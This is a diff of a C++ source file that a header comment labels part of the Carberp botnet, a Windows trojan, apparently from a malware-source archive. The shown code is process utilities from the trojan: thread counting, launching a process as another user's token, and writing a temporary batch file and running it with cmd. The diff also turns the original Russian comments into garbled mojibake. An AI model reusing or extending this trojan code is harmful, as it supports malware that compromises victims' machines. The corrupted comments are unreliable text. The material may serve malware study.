@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -104,7 +115,7 @@ TOKEN_USER *Process::_getUserByProcessId(DWORD id, LPDWORD sessionId)
 
 DWORD Process::_getCountOfThreadsByProcessId(DWORD id)
 {
-  //FIXME: Найти более быстрый способ.
+  //FIXME: пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   HANDLE snapshot = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, 0);
   if(snapshot != INVALID_HANDLE_VALUE)
   {
@@ -299,11 +310,11 @@ DWORD Process::_createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR mo
     DESTROYENVIRONMENTBLOCK destroyEnvironmentBlock = (DESTROYENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "DestroyEnvironmentBlock");
     if(createEnvironmentBlock != NULL && destroyEnvironmentBlock != NULL)
     {
-      //Создаем переменные окружения.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       void *environment = NULL;
-      if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //Параноя.
+      if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-      //Создаем процесс, полный аналог create().
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ create().
       {
         WCHAR zeroStr[1];
         zeroStr[0] = 0;
@@ -432,12 +443,12 @@ bool Process::_runTempBatch(const LPSTR context)
   WCHAR batFileW[MAX_PATH];
   if(Fs::_createTempFileEx(NULL, L"bat", batFileW))
   {
-    //Создаем батник.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       LPSTR buf;
       int bufSize;
 
-      //Создаем скрипт.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       {
         char batFileA[MAX_PATH];
         CWA(user32, CharToOemW)(batFileW, batFileA);
@@ -445,13 +456,13 @@ bool Process::_runTempBatch(const LPSTR context)
         if(bufSize == -1)goto BADEND;
       }
 
-      //Сохраняем.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       bool ok = Fs::_saveToFile(batFileW, buf, bufSize);
       Mem::free(buf);
       if(!ok)goto BADEND;
     }
 
-    //Запускаем батник.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       WCHAR cmdLine[MAX_PATH + 10];
       if(Str::_sprintfW(cmdLine, sizeof(cmdLine) / sizeof(WCHAR), L"/c \"%s\"", batFileW) > -1)
